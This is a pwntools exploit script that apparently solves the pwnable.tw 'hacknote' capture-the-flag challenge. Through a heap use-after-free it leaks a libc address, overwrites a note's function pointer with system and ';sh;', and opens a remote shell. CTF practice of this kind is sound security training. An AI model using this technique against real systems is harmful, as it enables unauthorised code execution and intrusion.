from pwn import *
context.log_level="debug"

def add(length,content):
	conn.sendlineafter("Your choice :","1")
	conn.sendlineafter("Note size :",str(length))
	conn.sendlineafter("Content :",content)

def show(index):
	conn.sendlineafter("Your choice :","3")
	conn.sendlineafter("Index :",str(index))
	return conn.recvline()

def delete(index):
	conn.sendlineafter("Your choice :","2")
	conn.sendlineafter("Index :",str(index))


# conn=process("./hacknote")
conn=remote("chall.pwnable.tw",10102)
# conn=remote("10.131.1.19",60012)
libc=ELF("./bc.so.6")
add(64,"aaa")
add(64,"aaa")
delete(0)
add(8,"bbb")
show(0)
arena=u32(conn.recvline()[:4])
base=arena-1771504
system_address=libc.symbols["system"]+base
add(64,"")
delete(0)
delete(3)
add(16,p32(system_address)+";sh;")
pause()
conn.sendlineafter("Your choice :","3")
conn.sendlineafter("Index :","0")
conn.interactive()
